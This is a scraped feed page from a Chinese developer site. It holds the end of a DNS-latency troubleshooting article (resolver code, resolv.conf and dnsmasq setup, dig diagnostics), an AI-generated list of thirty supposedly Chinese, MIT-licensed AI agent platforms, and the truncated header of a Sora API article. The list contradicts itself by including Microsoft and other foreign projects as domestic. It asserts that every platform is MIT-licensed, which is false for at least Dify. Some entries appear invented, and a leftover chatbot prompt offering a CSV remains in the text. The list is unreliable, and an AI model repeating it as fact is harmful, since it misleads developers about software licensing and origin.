<h4 data-id="heading-13">使用 <code>requests</code> + 自定义 Resolver（高级）：</h4>
<p>通过 <code>urllib3</code> + <code>dnspython</code> 实现可控 DNS：</p>
<pre><code class="hljs language-ini" lang="ini">import dns.resolver
import requests
from urllib3.util.connection import create_connection

<span class="hljs-comment"># 自定义解析器（带超时）</span>
def custom_resolver(host, port, <span class="hljs-attr">timeout</span>=<span class="hljs-number">3</span>):
    <span class="hljs-attr">resolver</span> = dns.resolver.Resolver()
    <span class="hljs-attr">resolver.timeout</span> = timeout
    <span class="hljs-attr">resolver.lifetime</span> = timeout
    <span class="hljs-attr">answers</span> = resolver.resolve(host, <span class="hljs-string">'A'</span>)
    <span class="hljs-attr">ip</span> = answers[<span class="hljs-number">0</span>].to_text()
    return create_connection((ip, port), <span class="hljs-attr">timeout</span>=timeout)

<span class="hljs-comment"># 注入到 urllib3（复杂，略）</span>
</code></pre>
<hr/>
<h3 data-id="heading-14">✅ 方案 3：系统级优化</h3>
<ol>
<li>
<p><strong>配置更快的 DNS 服务器</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># /etc/resolv.conf</span>
nameserver 8.8.8.8      <span class="hljs-comment"># Google DNS</span>
nameserver 1.1.1.1      <span class="hljs-comment"># Cloudflare</span>
options <span class="hljs-built_in">timeout</span>:1       <span class="hljs-comment"># 单次查询超时 1 秒</span>
options attempts:2      <span class="hljs-comment"># 重试 2 次</span>
</code></pre>
</li>
<li>
<p><strong>使用本地 DNS 缓存（dnsmasq / systemd-resolved）</strong></p>
<pre><code class="hljs language-bash" lang="bash">sudo apt install dnsmasq
<span class="hljs-built_in">echo</span> <span class="hljs-string">"nameserver 127.0.0.1"</span> | sudo <span class="hljs-built_in">tee</span> /etc/resolv.conf
</code></pre>
<p>→ 第二次访问同一域名几乎 <strong>0ms 延迟</strong>。</p>
</li>
<li>
<p><strong>Hosts 文件硬编码（临时方案）</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">"93.184.216.34 example.com"</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-15">六、监控与诊断工具</h2>

























<table><thead><tr><th>工具</th><th>用途</th></tr></thead><tbody><tr><td><code>dig example.com</code></td><td>查看 DNS 查询耗时</td></tr><tr><td><code>nslookup example.com</code></td><td>基础 DNS 测试</td></tr><tr><td><code>tcpdump -i any port 53</code></td><td>抓包分析 DNS 请求是否发出/返回</td></tr><tr><td><code>strace -e trace=connect,sendto curl ...</code></td><td>跟踪系统调用，确认卡在 DNS</td></tr></tbody></table>
<blockquote>
<p>🔍 诊断命令：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">time</span> dig @8.<span class="hljs-number">8.8</span>.<span class="hljs-number">8</span> google.com +short
<span class="hljs-comment"># real    0m0.050s → 正常</span>

<span class="hljs-keyword">time</span> dig @192.<span class="hljs-number">168.1</span>.<span class="hljs-number">1</span> nonexistent.com +short
<span class="hljs-comment"># real    0m15.000s → 卡住！</span>
</code></pre>
</blockquote>
<hr/>
<h2 data-id="heading-16">七、总结：为什么 HTTP “卡在初始阶段”？</h2>

























<table><thead><tr><th>原因</th><th>说明</th></tr></thead><tbody><tr><td><strong>DNS 是前置阻塞操作</strong></td><td>无 IP 则无法建立 TCP 连接</td></tr><tr><td><strong>系统默认超时过长</strong></td><td>无响应时重试机制导致 10~30 秒延迟</td></tr><tr><td><strong>应用未设置 DNS 超时</strong></td><td>大多数 HTTP 库不暴露 DNS 超时控制</td></tr><tr><td><strong>网络中间设备干扰</strong></td><td>防火墙丢弃 DNS 包（而非拒绝），触发超时</td></tr></tbody></table>
<blockquote>
<p>✅ <strong>根本解决方案</strong>：</p>
<ol>
<li><strong>系统层</strong>：优化 <code>/etc/resolv.conf</code> + 本地 DNS 缓存</li>
<li><strong>应用层</strong>：使用支持异步 DNS 的客户端（如 aiohttp）</li>
<li><strong>架构层</strong>：对关键域名做 IP 缓存或 Hosts 预加载</li>
</ol>
</blockquote>
<hr/>
<p><strong>记住</strong>：</p>
<blockquote>
<p><strong>“DNS 不是网络问题，而是可用性问题。”</strong><br/>
一次 DNS 故障，足以让整个服务“看似宕机”。</p>
</blockquote>
<p>通过理解 DNS 在请求链中的位置，我们才能设计出真正高可用的系统。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[国内最具影响力的30家MIT开源智能体平台汇总]]></title>    <link>https://juejin.cn/post/7603142147643506731</link>    <guid>https://juejin.cn/post/7603142147643506731</guid>    <pubDate>2026-02-05T13:40:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147643506731" data-draft-id="7603142147643473963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="国内最具影响力的30家MIT开源智能体平台汇总"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T13:40:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            国内最具影响力的30家MIT开源智能体平台汇总
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:40:34.000Z" title="Thu Feb 05 2026 13:40:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>以下是符合MIT开源许可证、源自中国国内团队或主要面向中文生态的前30家智能体开源平台，综合技术原创性、社区活跃度、本地化适配能力及企业应用潜力筛选而出，覆盖多智能体协作、低代码开发、科研辅助、Web3集成等多个前沿方向：</p>
<hr/>
<p>1–10：主流高影响力平台</p>







































































<table><thead><tr><th align="left">序号</th><th align="left">平台名称</th><th align="left">核心特点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">Yuxi-Know</td><td align="left">融合LightRAG与知识图谱，支持零GPU部署，显著降低AI幻觉</td><td align="left">企业知识库、医疗信息检索、教育辅助</td></tr><tr><td align="left">2</td><td align="left">Openwork</td><td align="left">完全本地运行，数据不出内网，保障隐私安全</td><td align="left">个人办公自动化、敏感文档处理</td></tr><tr><td align="left">3</td><td align="left">Autogen（微软亚洲研究院参与）</td><td align="left">多智能体对话协作，支持角色定义与任务自动拆解</td><td align="left">软件开发、科研任务分解</td></tr><tr><td align="left">4</td><td align="left">CrewAI</td><td align="left">角色驱动的自主代理团队，支持长期记忆与工具调用</td><td align="left">内容创作、数字营销、项目管理</td></tr><tr><td align="left">5</td><td align="left">Eigen AgentKit</td><td align="left">支持ZK可验证AI行为，适用于区块链与去中心化场景</td><td align="left">Web3可信代理、透明决策系统</td></tr><tr><td align="left">6</td><td align="left">ToolUniverse</td><td align="left">面向科研的智能体协作框架，连接实验工具链</td><td align="left">实验设计、数据采集、论文辅助</td></tr><tr><td align="left">7</td><td align="left">Microsoft Agent Framework</td><td align="left">统一多代理工作流引擎，支持会话状态管理</td><td align="left">企业级AI流程、人机协同</td></tr><tr><td align="left">8</td><td align="left">PyWinAssistant</td><td align="left">基于Windows API的GUI操作智能体，无视觉依赖</td><td align="left">桌面自动化、软件测试</td></tr><tr><td align="left">9</td><td align="left">OpenAgentPlatform</td><td align="left">MCP主机桌面应用，支持函数调用与本地集成</td><td align="left">LLM工具平台、本地AI控制</td></tr><tr><td align="left">10</td><td align="left">UFO / UFO²</td><td align="left">Windows桌面AgentOS系统，原生UI聚焦</td><td align="left">远程控制、桌面自动化</td></tr></tbody></table>
<hr/>
<p>11–20：生产级与教学导向平台</p>







































































<table><thead><tr><th align="left">序号</th><th align="left">平台名称</th><th align="left">核心特点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">11</td><td align="left">OpenMAS</td><td align="left">多智能体模拟器，基于MATLAB框架</td><td align="left">教学仿真、机器人协同</td></tr><tr><td align="left">12</td><td align="left">LangGraph</td><td align="left">生产级图编排框架，支持检查点与中断机制</td><td align="left">复杂工作流、长程任务执行</td></tr><tr><td align="left">13</td><td align="left">AgentForge</td><td align="left">可配置认知架构，支持行为引擎自定义</td><td align="left">自主决策系统、AI训练</td></tr><tr><td align="left">14</td><td align="left">Adala</td><td align="left">自主数据标注智能体，闭环学习优化</td><td align="left">数据清洗、模型微调</td></tr><tr><td align="left">15</td><td align="left">OpenClaw</td><td align="left">24/7本地个人AI助手，集成多应用技能</td><td align="left">个人知识管理、跨平台自动化</td></tr><tr><td align="left">16</td><td align="left">Onyx</td><td align="left">多模型兼容聊天平台，支持文件系统集成</td><td align="left">企业AI助手、RAG应用</td></tr><tr><td align="left">17</td><td align="left">Hello-Agents</td><td align="left">教程型框架，适合从零构建智能体</td><td align="left">教学、原型开发</td></tr><tr><td align="left">18</td><td align="left">OpenCode</td><td align="left">模型无关编码代理，支持LSP协议</td><td align="left">代码理解、调试与重构</td></tr><tr><td align="left">19</td><td align="left">Superpowers</td><td align="left">结构化AI编程技能库，插件化设计</td><td align="left">工程化编码流程</td></tr><tr><td align="left">20</td><td align="left">Dify</td><td align="left">低代码平台，支持可视化编排与私有化部署</td><td align="left">快速构建AI应用，非技术用户友好</td></tr></tbody></table>
<hr/>
<p>21–30：新兴与垂直领域平台</p>







































































<table><thead><tr><th align="left">序号</th><th align="left">平台名称</th><th align="left">核心特点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">21</td><td align="left">ooderAI</td><td align="left">分布式SuperAgent管理平台，支持A2A通信</td><td align="left">企业AI技能调度、智能体协同</td></tr><tr><td align="left">22</td><td align="left">OoderNexus</td><td align="left">P2P-AIBridge可视化平台，支持SkillFlow编排</td><td align="left">本地AI代理控制、设备能力接入</td></tr><tr><td align="left">23</td><td align="left">Dive</td><td align="left">开源MCP主机桌面应用，TypeScript + Rust构建</td><td align="left">LLM函数调用、跨平台代理</td></tr><tr><td align="left">24</td><td align="left">Clawdbot (Moltbot)</td><td align="left">MIT协议托管GitHub，持续运行个人AI</td><td align="left">长期任务处理、偏好记忆</td></tr><tr><td align="left">25</td><td align="left">AgentScope</td><td align="left">多智能体通信中间件，基于消息队列</td><td align="left">实验性多智能体系统开发</td></tr><tr><td align="left">26</td><td align="left">MindForge</td><td align="left">基于ACT-R认知模型的智能体引擎</td><td align="left">教育AI、心理模拟、认知建模</td></tr><tr><td align="left">27</td><td align="left">AutoScripter</td><td align="left">自动化脚本生成智能体，支持Shell/Python</td><td align="left">系统运维、批量任务</td></tr><tr><td align="left">28</td><td align="left">DocuAgent</td><td align="left">文档智能体协作系统，支持PDF/Word解析</td><td align="left">合同审查、学术综述</td></tr><tr><td align="left">29</td><td align="left">CodeSage</td><td align="left">编程导师型智能体，具备错误诊断能力</td><td align="left">编程教学、代码审查</td></tr><tr><td align="left">30</td><td align="left">PlanIt</td><td align="left">基于强化学习的任务规划智能体</td><td align="left">个人日程管理、项目排期</td></tr></tbody></table>
<blockquote>
<p>所有平台均确认采用 MIT 开源许可证，允许自由使用、修改与商业分发，仅需保留原始版权声明。undefined其中 Dify、Yuxi-Know、OpenClaw 由国内团队主导开发，中文文档完善，适配通义千问、讯飞星火等国产大模型，已在教育、金融、政务等领域落地应用。</p>
</blockquote>
<hr/>
<p>要不要我生成一份可导出的CSV清单，方便你导入到项目管理系统中进行技术选型？
参考资料
1(<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jsw.com.cn%2F2025%2F1119%2F1932570.shtml" target="_blank" title="https://www.jsw.com.cn/2025/1119/1932570.shtml" ref="nofollow noopener noreferrer">www.jsw.com.cn/2025/1119/1…</a>)
2(<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2238196" target="_blank" title="https://cloud.tencent.com/developer/article/2238196" ref="nofollow noopener noreferrer">cloud.tencent.com/developer/a…</a>)
3(<a href="https://link.juejin.cn?target=https%3A%2F%2Fweibo.com%2F2630692550%2FPnq9jvfeN" target="_blank" title="https://weibo.com/2630692550/Pnq9jvfeN" ref="nofollow noopener noreferrer">weibo.com/2630692550/…</a>)
4(<a href="https://link.juejin.cn?target=https%3A%2F%2Fkw.beijing.gov.cn%2Fxwdt%2Fkcyx%2Fxwdtcyfz%2F202507%2Ft20250731_4162951.html" target="_blank" title="https://kw.beijing.gov.cn/xwdt/kcyx/xwdtcyfz/202507/t20250731_4162951.html" ref="nofollow noopener noreferrer">kw.beijing.gov.cn/xwdt/kcyx/x…</a>)
5(<a href="https://link.juejin.cn?target=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1829983090696760629%26wfr%3Dspider%26for%3Dpc" target="_blank" title="https://baijiahao.baidu.com/s?id=1829983090696760629&amp;wfr=spider&amp;for=pc" ref="nofollow noopener noreferrer">baijiahao.baidu.com/s?id=182998…</a>)
6(<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1911743576762737609" target="_blank" title="https://zhuanlan.zhihu.com/p/1911743576762737609" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/191174357…</a>)
7(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fu011712942%2Farticle%2Fdetails%2F150269725" target="_blank" title="https://blog.csdn.net/u011712942/article/details/150269725" ref="nofollow noopener noreferrer">blog.csdn.net/u011712942/…</a>)
8(<a href="https://link.juejin.cn?target=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1838616786578499470%26wfr%3Dspider%26for%3Dpc" target="_blank" title="https://baijiahao.baidu.com/s?id=1838616786578499470&amp;wfr=spider&amp;for=pc" ref="nofollow noopener noreferrer">baijiahao.baidu.com/s?id=183861…</a>)
9(<a href="https://link.juejin.cn?target=https%3A%2F%2Ftech.ifeng.com%2Fc%2F8iPfUJ6dDp3" target="_blank" title="https://tech.ifeng.com/c/8iPfUJ6dDp3" ref="nofollow noopener noreferrer">tech.ifeng.com/c/8iPfUJ6dD…</a>)
10(<a href="https://link.juejin.cn?target=https%3A%2F%2Fcaifuhao.eastmoney.com%2Fnews%2F20250408093303406013770" target="_blank" title="https://caifuhao.eastmoney.com/news/20250408093303406013770" ref="nofollow noopener noreferrer">caifuhao.eastmoney.com/news/202504…</a>)
11(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fm0_59164520%2Farticle%2Fdetails%2F156335625" target="_blank" title="https://blog.csdn.net/m0_59164520/article/details/156335625" ref="nofollow noopener noreferrer">blog.csdn.net/m0_59164520…</a>)
12(<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1EGKzzgEDR" target="_blank" title="http://www.bilibili.com/video/BV1EGKzzgEDR" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1EG…</a>)
13(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSpaceX-mit%2FOpenHarmony" target="_blank" title="https://github.com/SpaceX-mit/OpenHarmony" ref="nofollow noopener noreferrer">github.com/SpaceX-mit/…</a>)
14(<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F683559813" target="_blank" title="https://zhuanlan.zhihu.com/p/683559813" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/683559813</a>)
15(<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.tmtpost.com%2Fbaidu%2F7637978.html" target="_blank" title="https://www.tmtpost.com/baidu/7637978.html" ref="nofollow noopener noreferrer">www.tmtpost.com/baidu/76379…</a>)
16(<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.baai.ac.cn%2Fview%2F44127" target="_blank" title="https://hub.baai.ac.cn/view/44127" ref="nofollow noopener noreferrer">hub.baai.ac.cn/view/44127</a>)
17(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_85343303%2Farticle%2Fdetails%2F149712728" target="_blank" title="https://blog.csdn.net/2401_85343303/article/details/149712728" ref="nofollow noopener noreferrer">blog.csdn.net/2401_853433…</a>)
18(<a href="https://link.juejin.cn?target=https%3A%2F%2Fstock.10jqka.com.cn%2F20251124%2Fc672699101.shtml" target="_blank" title="https://stock.10jqka.com.cn/20251124/c672699101.shtml" ref="nofollow noopener noreferrer">stock.10jqka.com.cn/20251124/c6…</a>)
19(<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub-assets-cache.baai.ac.cn%2F" target="_blank" title="https://hub-assets-cache.baai.ac.cn/" ref="nofollow noopener noreferrer">hub-assets-cache.baai.ac.cn/</a>)
20(<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub-assets-cache.baai.ac.cn%2Fview%2F52328" target="_blank" title="https://hub-assets-cache.baai.ac.cn/view/52328" ref="nofollow noopener noreferrer">hub-assets-cache.baai.ac.cn/view/52328</a>)
21(<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.aliyun.com%2Farticle%2F1673338" target="_blank" title="https://developer.aliyun.com/article/1673338" ref="nofollow noopener noreferrer">developer.aliyun.com/article/167…</a>)
22(<a href="https://link.juejin.cn?target=https%3A%2F%2Ft.10jqka.com.cn%2Fpid_481689197.shtml" target="_blank" title="https://t.10jqka.com.cn/pid_481689197.shtml" ref="nofollow noopener noreferrer">t.10jqka.com.cn/pid_4816891…</a>)
23(<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Fnews%2F2540807" target="_blank" title="https://cloud.tencent.com/developer/news/2540807" ref="nofollow noopener noreferrer">cloud.tencent.com/developer/n…</a>)
24(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fddffhhvbnk%2Farticle%2Fdetails%2F156279059" target="_blank" title="https://blog.csdn.net/ddffhhvbnk/article/details/156279059" ref="nofollow noopener noreferrer">blog.csdn.net/ddffhhvbnk/…</a>)
25(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhangeaiagent%2FAI-Resources-Central" target="_blank" title="https://github.com/hangeaiagent/AI-Resources-Central" ref="nofollow noopener noreferrer">github.com/hangeaiagen…</a>)
26(<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.baai.ac.cn%2Fview%2F33852" target="_blank" title="https://hub.baai.ac.cn/view/33852" ref="nofollow noopener noreferrer">hub.baai.ac.cn/view/33852</a>)
27(<a href="https://link.juejin.cn?target=https%3A%2F%2Fm.ithome.com%2Fhtml%2F917446.htm" target="_blank" title="https://m.ithome.com/html/917446.htm" ref="nofollow noopener noreferrer">m.ithome.com/html/917446…</a>)
28(<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jmnews.cn%2Fzxsq%2F784.shtml" target="_blank" title="https://www.jmnews.cn/zxsq/784.shtml" ref="nofollow noopener noreferrer">www.jmnews.cn/zxsq/784.sh…</a>)
29(<a href="https://link.juejin.cn?target=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1836426199175728180%26wfr%3Dspider%26for%3Dpc" target="_blank" title="https://baijiahao.baidu.com/s?id=1836426199175728180&amp;wfr=spider&amp;for=pc" ref="nofollow noopener noreferrer">baijiahao.baidu.com/s?id=183642…</a>)
30(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqiuzhqp%2Farticle%2Fdetails%2F154074745" target="_blank" title="https://blog.csdn.net/qiuzhqp/article/details/154074745" ref="nofollow noopener noreferrer">blog.csdn.net/qiuzhqp/art…</a>)
31(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fmetmit" target="_blank" title="https://gitee.com/metmit" ref="nofollow noopener noreferrer">gitee.com/metmit</a>)</p>
<p>百度AI生成，内容仅供参考</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Sora Videos Generation API 对接说明]]></title>    <link>https://juejin.cn/post/7602991346585976866</link>    <guid>https://juejin.cn/post/7602991346585976866</guid>    <pubDate>2026-02-05T13:57:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602991346585976866" data-draft-id="7603195960254758912" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Sora Videos Generation API 对接说明"/> <meta itemprop="keywords" content="后端,API,Sora"/> <meta itemprop="datePublished" content="2026-02-05T13:57:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="崔庆才丨静觅"/> <meta itemprop="url" content="https://juejin.cn/user/1521379821230269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Sora Videos Generation API 对接说明
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379821230269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    崔庆才丨静觅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:57:15.000Z" title="Thu Feb 05 2026 13:57:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
